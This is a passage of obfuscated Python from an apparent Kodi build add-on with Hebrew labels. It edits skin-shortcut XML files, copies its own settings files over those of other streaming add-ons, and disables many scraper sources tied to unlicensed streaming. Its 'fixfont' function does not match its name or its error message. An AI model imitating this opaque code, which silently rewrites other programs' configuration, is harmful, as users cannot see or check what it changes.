		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1193
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1196
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1197
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1201
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1202
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1203
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1221
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1224
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1225
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1229
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1230
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1231
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1249
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1252
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1253
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1257
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1258
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1259
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1277
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1280
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1281
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1284
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1285
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1286
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1304
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1307
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1308
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1310
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1311
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1312
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1330
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1333
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1334
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1336
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1337
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1338
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1356
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1359
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1360
    O0OOO0O00OOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1363
    with open (O0OOO0O00OOO000O0 ,'r')as OOO0OO0O0000OO0OO :#line:1364
      O0O0O000O0O000O00 =OOO0OO0O0000OO0OO .read ()#line:1365
    O0O0O000O0O000O00 =O0O0O000O0O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1383
    with open (O0OOO0O00OOO000O0 ,'w')as OOO0OO0O0000OO0OO :#line:1386
      OOO0OO0O0000OO0OO .write (O0O0O000O0O000O00 )#line:1387
def rdbuildinstallON ():#line:1390
    try :#line:1392
       O00000000OOO0OOO0 =ADDONPATH +"/resources/rd/victory.xml"#line:1393
       O0O0OOOO0OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1394
       copyfile (O00000000OOO0OOO0 ,O0O0OOOO0OO0OOOOO )#line:1396
       O00000000OOO0OOO0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1398
       O0O0OOOO0OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1399
       copyfile (O00000000OOO0OOO0 ,O0O0OOOO0OO0OOOOO )#line:1401
       O00000000OOO0OOO0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1403
       O0O0OOOO0OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1404
       copyfile (O00000000OOO0OOO0 ,O0O0OOOO0OO0OOOOO )#line:1406
       O00000000OOO0OOO0 =ADDONPATH +"/resources/rd/Splash.png"#line:1409
       O0O0OOOO0OO0OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1410
       copyfile (O00000000OOO0OOO0 ,O0O0OOOO0OO0OOOOO )#line:1412
    except :#line:1414
       pass #line:1415
def rdbuild ():#line:1425
	O0OOOO0O0O0O0OO00 =(ADDON .getSetting ("auto_rd"))#line:1426
	if O0OOOO0O0O0O0OO00 =='true':#line:1427
		OOO00O0OO0O0000OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1428
		OOO00O0OO0O0000OO .setSetting ('all_t','0')#line:1429
		OOO00O0OO0O0000OO .setSetting ('rd_menu_enable','false')#line:1430
		OOO00O0OO0O0000OO .setSetting ('magnet_bay','false')#line:1431
		OOO00O0OO0O0000OO .setSetting ('magnet_extra','false')#line:1432
		OOO00O0OO0O0000OO .setSetting ('rd_only','false')#line:1433
		OOO00O0OO0O0000OO .setSetting ('ftp','false')#line:1435
		OOO00O0OO0O0000OO .setSetting ('fp','false')#line:1436
		OOO00O0OO0O0000OO .setSetting ('filter_fp','false')#line:1437
		OOO00O0OO0O0000OO .setSetting ('fp_size_en','false')#line:1438
		OOO00O0OO0O0000OO .setSetting ('afdah','false')#line:1439
		OOO00O0OO0O0000OO .setSetting ('ap2s','false')#line:1440
		OOO00O0OO0O0000OO .setSetting ('cin','false')#line:1441
		OOO00O0OO0O0000OO .setSetting ('clv','false')#line:1442
		OOO00O0OO0O0000OO .setSetting ('cmv','false')#line:1443
		OOO00O0OO0O0000OO .setSetting ('dl20','false')#line:1444
		OOO00O0OO0O0000OO .setSetting ('esc','false')#line:1445
		OOO00O0OO0O0000OO .setSetting ('extra','false')#line:1446
		OOO00O0OO0O0000OO .setSetting ('film','false')#line:1447
		OOO00O0OO0O0000OO .setSetting ('fre','false')#line:1448
		OOO00O0OO0O0000OO .setSetting ('fxy','false')#line:1449
		OOO00O0OO0O0000OO .setSetting ('genv','false')#line:1450
		OOO00O0OO0O0000OO .setSetting ('getgo','false')#line:1451
		OOO00O0OO0O0000OO .setSetting ('gold','false')#line:1452
		OOO00O0OO0O0000OO .setSetting ('gona','false')#line:1453
		OOO00O0OO0O0000OO .setSetting ('hdmm','false')#line:1454
		OOO00O0OO0O0000OO .setSetting ('hdt','false')#line:1455
		OOO00O0OO0O0000OO .setSetting ('icy','false')#line:1456
		OOO00O0OO0O0000OO .setSetting ('ind','false')#line:1457
		OOO00O0OO0O0000OO .setSetting ('iwi','false')#line:1458
		OOO00O0OO0O0000OO .setSetting ('jen_free','false')#line:1459
		OOO00O0OO0O0000OO .setSetting ('kiss','false')#line:1460
		OOO00O0OO0O0000OO .setSetting ('lavin','false')#line:1461
		OOO00O0OO0O0000OO .setSetting ('los','false')#line:1462
		OOO00O0OO0O0000OO .setSetting ('m4u','false')#line:1463
		OOO00O0OO0O0000OO .setSetting ('mesh','false')#line:1464
		OOO00O0OO0O0000OO .setSetting ('mf','false')#line:1465
		OOO00O0OO0O0000OO .setSetting ('mkvc','false')#line:1466
		OOO00O0OO0O0000OO .setSetting ('mjy','false')#line:1467
		OOO00O0OO0O0000OO .setSetting ('hdonline','false')#line:1468
		OOO00O0OO0O0000OO .setSetting ('moviex','false')#line:1469
		OOO00O0OO0O0000OO .setSetting ('mpr','false')#line:1470
		OOO00O0OO0O0000OO .setSetting ('mvg','false')#line:1471
		OOO00O0OO0O0000OO .setSetting ('mvl','false')#line:1472
		OOO00O0OO0O0000OO .setSetting ('mvs','false')#line:1473
		OOO00O0OO0O0000OO .setSetting ('myeg','false')#line:1474
		OOO00O0OO0O0000OO .setSetting ('ninja','false')#line:1475
		OOO00O0OO0O0000OO .setSetting ('odb','false')#line:1476
		OOO00O0OO0O0000OO .setSetting ('ophd','false')#line:1477
		OOO00O0OO0O0000OO .setSetting ('pks','false')#line:1478
		OOO00O0OO0O0000OO .setSetting ('prf','false')#line:1479
		OOO00O0OO0O0000OO .setSetting ('put18','false')#line:1480
		OOO00O0OO0O0000OO .setSetting ('req','false')#line:1481
		OOO00O0OO0O0000OO .setSetting ('rftv','false')#line:1482
		OOO00O0OO0O0000OO .setSetting ('rltv','false')#line:1483
		OOO00O0OO0O0000OO .setSetting ('sc','false')#line:1484
		OOO00O0OO0O0000OO .setSetting ('seehd','false')#line:1485
		OOO00O0OO0O0000OO .setSetting ('showbox','false')#line:1486
		OOO00O0OO0O0000OO .setSetting ('shuid','false')#line:1487
		OOO00O0OO0O0000OO .setSetting ('sil_gh','false')#line:1488
		OOO00O0OO0O0000OO .setSetting ('spv','false')#line:1489
		OOO00O0OO0O0000OO .setSetting ('subs','false')#line:1490
		OOO00O0OO0O0000OO .setSetting ('tvs','false')#line:1491
		OOO00O0OO0O0000OO .setSetting ('tw','false')#line:1492
		OOO00O0OO0O0000OO .setSetting ('upto','false')#line:1493
		OOO00O0OO0O0000OO .setSetting ('vel','false')#line:1494
		OOO00O0OO0O0000OO .setSetting ('vex','false')#line:1495
		OOO00O0OO0O0000OO .setSetting ('vidc','false')#line:1496
		OOO00O0OO0O0000OO .setSetting ('w4hd','false')#line:1497
		OOO00O0OO0O0000OO .setSetting ('wav','false')#line:1498
		OOO00O0OO0O0000OO .setSetting ('wf','false')#line:1499
		OOO00O0OO0O0000OO .setSetting ('wse','false')#line:1500
		OOO00O0OO0O0000OO .setSetting ('wss','false')#line:1501
		OOO00O0OO0O0000OO .setSetting ('wsse','false')#line:1502
		OOO00O0OO0O0000OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1503
		OOO00O0OO0O0000OO .setSetting ('debrid.only','true')#line:1504
		OOO00O0OO0O0000OO .setSetting ('hosts.captcha','false')#line:1505
		OOO00O0OO0O0000OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1506
		OOO00O0OO0O0000OO .setSetting ('provider.123moviehd','false')#line:1507
		OOO00O0OO0O0000OO .setSetting ('provider.300mbdownload','false')#line:1508
		OOO00O0OO0O0000OO .setSetting ('provider.alltube','false')#line:1509
		OOO00O0OO0O0000OO .setSetting ('provider.allucde','false')#line:1510
		OOO00O0OO0O0000OO .setSetting ('provider.animebase','false')#line:1511
		OOO00O0OO0O0000OO .setSetting ('provider.animeloads','false')#line:1512
		OOO00O0OO0O0000OO .setSetting ('provider.animetoon','false')#line:1513
		OOO00O0OO0O0000OO .setSetting ('provider.bnwmovies','false')#line:1514
		OOO00O0OO0O0000OO .setSetting ('provider.boxfilm','false')#line:1515
		OOO00O0OO0O0000OO .setSetting ('provider.bs','false')#line:1516
		OOO00O0OO0O0000OO .setSetting ('provider.cartoonhd','false')#line:1517
		OOO00O0OO0O0000OO .setSetting ('provider.cdahd','false')#line:1518
		OOO00O0OO0O0000OO .setSetting ('provider.cdax','false')#line:1519
		OOO00O0OO0O0000OO .setSetting ('provider.cine','false')#line:1520
		OOO00O0OO0O0000OO .setSetting ('provider.cinenator','false')#line:1521
		OOO00O0OO0O0000OO .setSetting ('provider.cmovieshdbz','false')#line:1522
		OOO00O0OO0O0000OO .setSetting ('provider.coolmoviezone','false')#line:1523
		OOO00O0OO0O0000OO .setSetting ('provider.ddl','false')#line:1524
		OOO00O0OO0O0000OO .setSetting ('provider.deepmovie','false')#line:1525
		OOO00O0OO0O0000OO .setSetting ('provider.ekinomaniak','false')#line:1526
		OOO00O0OO0O0000OO .setSetting ('provider.ekinotv','false')#line:1527
		OOO00O0OO0O0000OO .setSetting ('provider.filiser','false')#line:1528
		OOO00O0OO0O0000OO .setSetting ('provider.filmpalast','false')#line:1529
		OOO00O0OO0O0000OO .setSetting ('provider.filmwebbooster','false')#line:1530
		OOO00O0OO0O0000OO .setSetting ('provider.filmxy','false')#line:1531
		OOO00O0OO0O0000OO .setSetting ('provider.fmovies','false')#line:1532
		OOO00O0OO0O0000OO .setSetting ('provider.foxx','false')#line:1533
		OOO00O0OO0O0000OO .setSetting ('provider.freefmovies','false')#line:1534
		OOO00O0OO0O0000OO .setSetting ('provider.freeputlocker','false')#line:1535
		OOO00O0OO0O0000OO .setSetting ('provider.furk','false')#line:1536
		OOO00O0OO0O0000OO .setSetting ('provider.gamatotv','false')#line:1537
		OOO00O0OO0O0000OO .setSetting ('provider.gogoanime','false')#line:1538
		OOO00O0OO0O0000OO .setSetting ('provider.gowatchseries','false')#line:1539
		OOO00O0OO0O0000OO .setSetting ('provider.hackimdb','false')#line:1540
		OOO00O0OO0O0000OO .setSetting ('provider.hdfilme','false')#line:1541
		OOO00O0OO0O0000OO .setSetting ('provider.hdmto','false')#line:1542
		OOO00O0OO0O0000OO .setSetting ('provider.hdpopcorns','false')#line:1543
		OOO00O0OO0O0000OO .setSetting ('provider.hdstreams','false')#line:1544
		OOO00O0OO0O0000OO .setSetting ('provider.horrorkino','false')#line:1546
		OOO00O0OO0O0000OO .setSetting ('provider.iitv','false')#line:1547
		OOO00O0OO0O0000OO .setSetting ('provider.iload','false')#line:1548
		OOO00O0OO0O0000OO .setSetting ('provider.iwaatch','false')#line:1549
		OOO00O0OO0O0000OO .setSetting ('provider.kinodogs','false')#line:1550
		OOO00O0OO0O0000OO .setSetting ('provider.kinoking','false')#line:1551
		OOO00O0OO0O0000OO .setSetting ('provider.kinow','false')#line:1552
		OOO00O0OO0O0000OO .setSetting ('provider.kinox','false')#line:1553
		OOO00O0OO0O0000OO .setSetting ('provider.lichtspielhaus','false')#line:1554
		OOO00O0OO0O0000OO .setSetting ('provider.liomenoi','false')#line:1555
		OOO00O0OO0O0000OO .setSetting ('provider.magnetdl','false')#line:1558
		OOO00O0OO0O0000OO .setSetting ('provider.megapelistv','false')#line:1559
		OOO00O0OO0O0000OO .setSetting ('provider.movie2k-ac','false')#line:1560
		OOO00O0OO0O0000OO .setSetting ('provider.movie2k-ag','false')#line:1561
		OOO00O0OO0O0000OO .setSetting ('provider.movie2z','false')#line:1562
		OOO00O0OO0O0000OO .setSetting ('provider.movie4k','false')#line:1563
		OOO00O0OO0O0000OO .setSetting ('provider.movie4kis','false')#line:1564
		OOO00O0OO0O0000OO .setSetting ('provider.movieneo','false')#line:1565
		OOO00O0OO0O0000OO .setSetting ('provider.moviesever','false')#line:1566
		OOO00O0OO0O0000OO .setSetting ('provider.movietown','false')#line:1567
		OOO00O0OO0O0000OO .setSetting ('provider.mvrls','false')#line:1569
		OOO00O0OO0O0000OO .setSetting ('provider.netzkino','false')#line:1570
		OOO00O0OO0O0000OO .setSetting ('provider.odb','false')#line:1571
		OOO00O0OO0O0000OO .setSetting ('provider.openkatalog','false')#line:1572
		OOO00O0OO0O0000OO .setSetting ('provider.ororo','false')#line:1573
		OOO00O0OO0O0000OO .setSetting ('provider.paczamy','false')#line:1574
		OOO00O0OO0O0000OO .setSetting ('provider.peliculasdk','false')#line:1575
		OOO00O0OO0O0000OO .setSetting ('provider.pelisplustv','false')#line:1576
		OOO00O0OO0O0000OO .setSetting ('provider.pepecine','false')#line:1577
		OOO00O0OO0O0000OO .setSetting ('provider.primewire','false')#line:1578
		OOO00O0OO0O0000OO .setSetting ('provider.projectfreetv','false')#line:1579
		OOO00O0OO0O0000OO .setSetting ('provider.proxer','false')#line:1580
		OOO00O0OO0O0000OO .setSetting ('provider.pureanime','false')#line:1581
		OOO00O0OO0O0000OO .setSetting ('provider.putlocker','false')#line:1582
		OOO00O0OO0O0000OO .setSetting ('provider.putlockerfree','false')#line:1583
		OOO00O0OO0O0000OO .setSetting ('provider.reddit','false')#line:1584
		OOO00O0OO0O0000OO .setSetting ('provider.cartoonwire','false')#line:1585
		OOO00O0OO0O0000OO .setSetting ('provider.seehd','false')#line:1586
		OOO00O0OO0O0000OO .setSetting ('provider.segos','false')#line:1587
		OOO00O0OO0O0000OO .setSetting ('provider.serienstream','false')#line:1588
		OOO00O0OO0O0000OO .setSetting ('provider.series9','false')#line:1589
		OOO00O0OO0O0000OO .setSetting ('provider.seriesever','false')#line:1590
		OOO00O0OO0O0000OO .setSetting ('provider.seriesonline','false')#line:1591
		OOO00O0OO0O0000OO .setSetting ('provider.seriespapaya','false')#line:1592
		OOO00O0OO0O0000OO .setSetting ('provider.sezonlukdizi','false')#line:1593
		OOO00O0OO0O0000OO .setSetting ('provider.solarmovie','false')#line:1594
		OOO00O0OO0O0000OO .setSetting ('provider.solarmoviez','false')#line:1595
		OOO00O0OO0O0000OO .setSetting ('provider.stream-to','false')#line:1596
		OOO00O0OO0O0000OO .setSetting ('provider.streamdream','false')#line:1597
		OOO00O0OO0O0000OO .setSetting ('provider.streamflix','false')#line:1598
		OOO00O0OO0O0000OO .setSetting ('provider.streamit','false')#line:1599
		OOO00O0OO0O0000OO .setSetting ('provider.swatchseries','false')#line:1600
		OOO00O0OO0O0000OO .setSetting ('provider.szukajkatv','false')#line:1601
		OOO00O0OO0O0000OO .setSetting ('provider.tainiesonline','false')#line:1602
		OOO00O0OO0O0000OO .setSetting ('provider.tainiomania','false')#line:1603
		OOO00O0OO0O0000OO .setSetting ('provider.tata','false')#line:1606
		OOO00O0OO0O0000OO .setSetting ('provider.trt','false')#line:1607
		OOO00O0OO0O0000OO .setSetting ('provider.tvbox','false')#line:1608
		OOO00O0OO0O0000OO .setSetting ('provider.ultrahd','false')#line:1609
		OOO00O0OO0O0000OO .setSetting ('provider.video4k','false')#line:1610
		OOO00O0OO0O0000OO .setSetting ('provider.vidics','false')#line:1611
		OOO00O0OO0O0000OO .setSetting ('provider.view4u','false')#line:1612
		OOO00O0OO0O0000OO .setSetting ('provider.watchseries','false')#line:1613
		OOO00O0OO0O0000OO .setSetting ('provider.xrysoi','false')#line:1614
		OOO00O0OO0O0000OO .setSetting ('provider.library','false')#line:1615
def fixfont ():#line:1618
	OO00OOO0OO000O0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1619
	O00O0O000OOOO0O00 =json .loads (OO00OOO0OO000O0OO );#line:1621
	OOOOO0O000O000000 =O00O0O000OOOO0O00 ["result"]["settings"]#line:1622
	O0O0OOO0O0OOOO00O =[O0O0O00O0OO00OOO0 for O0O0O00O0OO00OOO0 in OOOOO0O000O000000 if O0O0O00O0OO00OOO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1624
	O0OO00OOO000OO00O =O0O0OOO0O0OOOO00O ["options"];#line:1625
	O00000000O0O0O00O =O0O0OOO0O0OOOO00O ["value"];#line:1626
	OO000OOOO00O0O0O0 =[OOO00000O0OO0O00O for (OOO00000O0OO0O00O ,OO0OO0O00OOOO000O )in enumerate (O0OO00OOO000OO00O )if OO0OO0O00OOOO000O ["value"]==O00000000O0O0O00O ][0 ];#line:1628
	OO0O00O0000OO00O0 =(OO000OOOO00O0O0O0 +1 )%len (O0OO00OOO000OO00O )#line:1630
	OOOOO0OOOOOO00000 =O0OO00OOO000OO00O [OO0O00O0000OO00O0 ]["value"]#line:1632
	OOOOOOOO0O00OOO00 =O0OO00OOO000OO00O [OO0O00O0000OO00O0 ]["label"]#line:1633
	O000OO00OOO00OOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1635
	try :#line:1637
		O0O00O0OOOO0000OO =json .loads (O000OO00OOO00OOO0 );#line:1638
		if O0O00O0OOOO0000OO ["result"]!=True :#line:1640
			raise Exception #line:1641
	except :#line:1642
		sys .stderr .write ("Error switching audio output device")#line:1643
		raise Exception #line:1644
def parseDOM2 (O0O000000OOO0OOOO ,name =u"",attrs ={},ret =False ):#line:1645
	if isinstance (O0O000000OOO0OOOO ,str ):#line:1648
		try :#line:1649
			O0O000000OOO0OOOO =[O0O000000OOO0OOOO .decode ("utf-8")]#line:1650
		except :#line:1651
			O0O000000OOO0OOOO =[O0O000000OOO0OOOO ]#line:1652
	elif isinstance (O0O000000OOO0OOOO ,unicode ):#line:1653
		O0O000000OOO0OOOO =[O0O000000OOO0OOOO ]#line:1654
	elif not isinstance (O0O000000OOO0OOOO ,list ):#line:1655
		return u""#line:1656
	if not name .strip ():#line:1658
		return u""#line:1659
	OOOOOO00O000OOOOO =[]#line:1661
	for OOOO00OO0O0OO0000 in O0O000000OOO0OOOO :#line:1662
		O00OOOOO00O0O0O0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOOO00OO0O0OO0000 )#line:1663
		for O0OOOOO000O0O0OO0 in O00OOOOO00O0O0O0O :#line:1664
			OOOO00OO0O0OO0000 =OOOO00OO0O0OO0000 .replace (O0OOOOO000O0O0OO0 ,O0OOOOO000O0O0OO0 .replace ("\n"," "))#line:1665
		O0O00O0OOO0OO0OO0 =[]#line:1667
		for O0O00000OOOO0000O in attrs :#line:1668
			OOOOO0OOO0OOO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00000OOOO0000O +'=[\'"]'+attrs [O0O00000OOOO0000O ]+'[\'"].*?>))',re .M |re .S ).findall (OOOO00OO0O0OO0000 )#line:1669
			if len (OOOOO0OOO0OOO0OO0 )==0 and attrs [O0O00000OOOO0000O ].find (" ")==-1 :#line:1670
				OOOOO0OOO0OOO0OO0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O00000OOOO0000O +'='+attrs [O0O00000OOOO0000O ]+'.*?>))',re .M |re .S ).findall (OOOO00OO0O0OO0000 )#line:1671
			if len (O0O00O0OOO0OO0OO0 )==0 :#line:1673
				O0O00O0OOO0OO0OO0 =OOOOO0OOO0OOO0OO0 #line:1674
				OOOOO0OOO0OOO0OO0 =[]#line:1675
			else :#line:1676
				O0OOOOO0O0O0OO0O0 =range (len (O0O00O0OOO0OO0OO0 ))#line:1677
				O0OOOOO0O0O0OO0O0 .reverse ()#line:1678
				for O0OOOO0O0000000O0 in O0OOOOO0O0O0OO0O0 :#line:1679
					if not O0O00O0OOO0OO0OO0 [O0OOOO0O0000000O0 ]in OOOOO0OOO0OOO0OO0 :#line:1680
						del (O0O00O0OOO0OO0OO0 [O0OOOO0O0000000O0 ])#line:1681
		if len (O0O00O0OOO0OO0OO0 )==0 and attrs =={}:#line:1683
			O0O00O0OOO0OO0OO0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOOO00OO0O0OO0000 )#line:1684
			if len (O0O00O0OOO0OO0OO0 )==0 :#line:1685
				O0O00O0OOO0OO0OO0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOOO00OO0O0OO0000 )#line:1686
		if isinstance (ret ,str ):#line:1688
			OOOOO0OOO0OOO0OO0 =[]#line:1689
			for O0OOOOO000O0O0OO0 in O0O00O0OOO0OO0OO0 :#line:1690
				O00000O0OOO000OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OOOOO000O0O0OO0 )#line:1691
				if len (O00000O0OOO000OOO )==0 :#line:1692
					O00000O0OOO000OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OOOOO000O0O0OO0 )#line:1693
				for OO000OOO0OOOOOOO0 in O00000O0OOO000OOO :#line:1694
					O000O00OO000O00O0 =OO000OOO0OOOOOOO0 [0 ]#line:1695
					if O000O00OO000O00O0 in "'\"":#line:1696
						if OO000OOO0OOOOOOO0 .find ('='+O000O00OO000O00O0 ,OO000OOO0OOOOOOO0 .find (O000O00OO000O00O0 ,1 ))>-1 :#line:1697
							OO000OOO0OOOOOOO0 =OO000OOO0OOOOOOO0 [:OO000OOO0OOOOOOO0 .find ('='+O000O00OO000O00O0 ,OO000OOO0OOOOOOO0 .find (O000O00OO000O00O0 ,1 ))]#line:1698
